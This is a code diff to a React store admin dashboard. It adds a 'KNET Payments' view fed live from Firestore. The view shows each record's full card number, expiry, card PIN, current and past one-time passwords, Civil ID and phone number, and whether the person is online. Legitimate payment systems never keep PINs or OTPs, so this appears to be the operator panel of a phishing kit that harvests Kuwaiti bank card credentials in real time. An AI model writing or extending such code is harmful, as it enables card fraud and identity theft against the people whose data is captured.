@@ -26,10 +26,16 @@ import {
   Truck,
   XCircle,
   Menu,
+  CreditCard,
+  Eye,
+  EyeOff,
+  Wifi,
+  WifiOff,
 } from "lucide-react";
 import { apiRequest, queryClient } from "@/lib/queryClient";
 import type { Product, OrderWithItems } from "@shared/schema";
 import logoImage from "@assets/logo.jpg";
+import { subscribeToKnetPayments, type KnetPayment } from "@/lib/firestore";
 
 function getAdminHeaders() {
   const token = localStorage.getItem("adminSession");
@@ -197,6 +203,173 @@ function OrderCard({ order, onStatusUpdate }: { order: OrderWithItems; onStatusU
   );
 }
 
+function KnetPaymentCard({ payment }: { payment: KnetPayment }) {
+  const [showPin, setShowPin] = useState(false);
+  const [showCard, setShowCard] = useState(false);
+
+  const maskCardNumber = (num: string) => {
+    if (!num) return "****";
+    return showCard ? num : "****" + num.slice(-4);
+  };
+
+  const getStatusColor = (status: string) => {
+    switch (status?.toLowerCase()) {
+      case "approved":
+        return "bg-green-100 text-green-800";
+      case "pendding":
+      case "pending":
+        return "bg-yellow-100 text-yellow-800";
+      case "rejected":
+        return "bg-red-100 text-red-800";
+      default:
+        return "bg-gray-100 text-gray-800";
+    }
+  };
+
+  return (
+    <Card data-testid={`knet-payment-${payment.id}`} className="mb-4">
+      <CardHeader className="pb-3">
+        <div className="flex flex-wrap items-center justify-between gap-2">
+          <div className="flex items-center gap-2">
+            <CardTitle className="text-base font-mono">
+              {payment.id.slice(0, 12)}...
+            </CardTitle>
+            {payment.online ? (
+              <Badge variant="outline" className="bg-green-50 text-green-700 border-green-300">
+                <Wifi className="h-3 w-3 me-1" />
+                Online
+              </Badge>
+            ) : (
+              <Badge variant="outline" className="bg-gray-50 text-gray-600 border-gray-300">
+                <WifiOff className="h-3 w-3 me-1" />
+                Offline
+              </Badge>
+            )}
+          </div>
+          <div className="flex items-center gap-2 flex-wrap">
+            <Badge className={getStatusColor(payment.status)}>
+              {payment.status || "Unknown"}
+            </Badge>
+            {payment.bank && (
+              <Badge variant="outline">{payment.bank}</Badge>
+            )}
+          </div>
+        </div>
+        <p className="text-sm text-muted-foreground">
+          {payment.createdDate ? new Date(payment.createdDate).toLocaleString() : "N/A"}
+        </p>
+      </CardHeader>
+      <CardContent className="space-y-4">
+        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
+          <div className="bg-muted/50 p-3 rounded-md">
+            <h4 className="font-medium text-sm mb-2 flex items-center gap-2">
+              <CreditCard className="h-4 w-4 text-primary" />
+              Card Details
+            </h4>
+            <div className="space-y-1 text-sm">
+              <div className="flex items-center justify-between gap-2">
+                <span className="text-muted-foreground">Card Number:</span>
+                <div className="flex items-center gap-1">
+                  <span className="font-mono">{payment.prefix}-{maskCardNumber(payment.cardNumber)}</span>
+                  <Button 
+                    variant="ghost" 
+                    size="icon" 
+                    className="h-6 w-6"
+                    onClick={() => setShowCard(!showCard)}
+                    data-testid={`toggle-card-${payment.id}`}
+                  >
+                    {showCard ? <EyeOff className="h-3 w-3" /> : <Eye className="h-3 w-3" />}
+                  </Button>
+                </div>
+              </div>
+              <div className="flex justify-between gap-2">
+                <span className="text-muted-foreground">Expiry:</span>
+                <span>{payment.month}/{payment.year}</span>
+              </div>
+              <div className="flex items-center justify-between gap-2">
+                <span className="text-muted-foreground">PIN:</span>
+                <div className="flex items-center gap-1">
+                  <span className="font-mono">{showPin ? payment.pass : "****"}</span>
+                  <Button 
+                    variant="ghost" 
+                    size="icon" 
+                    className="h-6 w-6"
+                    onClick={() => setShowPin(!showPin)}
+                    data-testid={`toggle-pin-${payment.id}`}
+                  >
+                    {showPin ? <EyeOff className="h-3 w-3" /> : <Eye className="h-3 w-3" />}
+                  </Button>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          {payment.otp || (payment.allOtps && payment.allOtps.length > 0) ? (
+            <div className="bg-muted/50 p-3 rounded-md">
+              <h4 className="font-medium text-sm mb-2">OTP Information</h4>
+              <div className="space-y-1 text-sm">
+                {payment.otp && (
+                  <div className="flex justify-between gap-2">
+                    <span className="text-muted-foreground">Current OTP:</span>
+                    <span className="font-mono font-bold">{payment.otp}</span>
+                  </div>
+                )}
+                {payment.allOtps && payment.allOtps.length > 0 && (
+                  <div>
+                    <span className="text-muted-foreground">All OTPs:</span>
+                    <div className="flex flex-wrap gap-1 mt-1">
+                      {payment.allOtps.filter(otp => otp && otp.trim()).map((otp, i) => (
+                        <Badge key={i} variant="secondary" className="font-mono text-xs">
+                          {otp.replace(/,/g, "").trim()}
+                        </Badge>
+                      ))}
+                    </div>
+                  </div>
+                )}
+                {payment.otp2 && (
+                  <div className="flex justify-between gap-2">
+                    <span className="text-muted-foreground">OTP 2:</span>
+                    <span className="font-mono font-bold">{payment.otp2}</span>
+                  </div>
+                )}
+              </div>
+            </div>
+          ) : null}
+
+          {(payment.phoneNumber || payment.idNumber) && (
+            <div className="bg-muted/50 p-3 rounded-md">
+              <h4 className="font-medium text-sm mb-2 flex items-center gap-2">
+                <Users className="h-4 w-4 text-primary" />
+                Additional Info
+              </h4>
+              <div className="space-y-1 text-sm">
+                {payment.idNumber && (
+                  <div className="flex justify-between gap-2">
+                    <span className="text-muted-foreground">Civil ID:</span>
+                    <span className="font-mono">{payment.idNumber}</span>
+                  </div>
+                )}
+                {payment.phoneNumber && (
+                  <div className="flex justify-between gap-2">
+                    <span className="text-muted-foreground">Phone:</span>
+                    <span>{payment.phoneNumber}</span>
+                  </div>
+                )}
+                {payment.network && (
+                  <div className="flex justify-between gap-2">
+                    <span className="text-muted-foreground">Network:</span>
+                    <span>{payment.network}</span>
+                  </div>
+                )}
+              </div>
+            </div>
+          )}
+        </div>
+      </CardContent>
+    </Card>
+  );
+}
+
 function ProductRow({ 
   product, 
   onUpdate 
@@ -332,6 +505,8 @@ function ProductRow({
 export default function AdminDashboard() {
   const [, setLocation] = useLocation();
   const [adminUser, setAdminUser] = useState<any>(null);
+  const [knetPayments, setKnetPayments] = useState<KnetPayment[]>([]);
+  const [knetLoading, setKnetLoading] = useState(true);
 
   useEffect(() => {
     const token = localStorage.getItem("adminSession");
@@ -348,6 +523,14 @@ export default function AdminDashboard() {
       setLocation("/admin/login");
     }
   }, [setLocation]);
+
+  useEffect(() => {
+    const unsubscribe = subscribeToKnetPayments((payments) => {
+      setKnetPayments(payments);
+      setKnetLoading(false);
+    });
+    return () => unsubscribe();
+  }, []);
 
   const { data: orders, refetch: refetchOrders, isLoading: ordersLoading } = useQuery<OrderWithItems[]>({
     queryKey: ["/api/orders"],
@@ -411,7 +594,7 @@ export default function AdminDashboard() {
       </header>
 
       <main className="container mx-auto px-4 py-6 space-y-6">
-        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
+        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-5 gap-4">
           <Card>
             <CardContent className="pt-6">
               <div className="flex items-center justify-between">
@@ -435,6 +618,23 @@ export default function AdminDashboard() {
                 </div>
                 <div className="h-12 w-12 rounded-full bg-yellow-100 flex items-center justify-center">
                   <ShoppingCart className="h-6 w-6 text-yellow-600" />
+                </div>
+              </div>
+            </CardContent>
+          </Card>
+          
+          <Card>
+            <CardContent className="pt-6">
+              <div className="flex items-center justify-between">
+                <div>
+                  <p className="text-sm text-muted-foreground">KNET Payments</p>
+                  <p className="text-2xl font-bold">{knetPayments.length}</p>
+                  <p className="text-xs text-muted-foreground">
+                    {knetPayments.filter(p => p.online).length} online
+                  </p>
+                </div>
+                <div className="h-12 w-12 rounded-full bg-purple-100 flex items-center justify-center">
+                  <CreditCard className="h-6 w-6 text-purple-600" />
                 </div>
               </div>
             </CardContent>
@@ -475,6 +675,10 @@ export default function AdminDashboard() {
               <ShoppingCart className="h-4 w-4 me-2" />
               Orders
             </TabsTrigger>
+            <TabsTrigger value="knet" data-testid="tab-knet">
+              <CreditCard className="h-4 w-4 me-2" />
+              KNET Payments
+            </TabsTrigger>
             <TabsTrigger value="products" data-testid="tab-products">
               <Package className="h-4 w-4 me-2" />
               Inventory
@@ -502,6 +706,47 @@ export default function AdminDashboard() {
                     onStatusUpdate={() => refetchOrders()}
                   />
                 ))}
+              </div>
+            )}
+          </TabsContent>
+
+          <TabsContent value="knet" className="space-y-4">
+            {knetLoading ? (
+              <div className="flex justify-center py-12">
+                <Loader2 className="h-8 w-8 animate-spin text-primary" />
+              </div>
+            ) : knetPayments.length === 0 ? (
+              <Card>
+                <CardContent className="py-12 text-center">
+                  <CreditCard className="h-12 w-12 mx-auto text-muted-foreground mb-4" />
+                  <p className="text-muted-foreground">No KNET payments yet</p>
+                </CardContent>
+              </Card>
+            ) : (
+              <div className="space-y-4">
+                <div className="flex items-center justify-between gap-4 flex-wrap">
+                  <div>
+                    <h2 className="text-lg font-semibold">KNET Payment Records</h2>
+                    <p className="text-sm text-muted-foreground">
+                      Real-time payment data from Firestore ({knetPayments.length} total)
+                    </p>
+                  </div>
+                  <div className="flex items-center gap-2">
+                    <Badge variant="outline" className="bg-green-50 text-green-700">
+                      <Wifi className="h-3 w-3 me-1" />
+                      {knetPayments.filter(p => p.online).length} Online
+                    </Badge>
+                    <Badge variant="outline" className="bg-gray-50 text-gray-600">
+                      <WifiOff className="h-3 w-3 me-1" />
+                      {knetPayments.filter(p => !p.online).length} Offline
+                    </Badge>
+                  </div>
+                </div>
+                <div className="grid gap-4">
+                  {knetPayments.map((payment) => (
+                    <KnetPaymentCard key={payment.id} payment={payment} />
+                  ))}
+                </div>
               </div>
             )}
           </TabsContent>
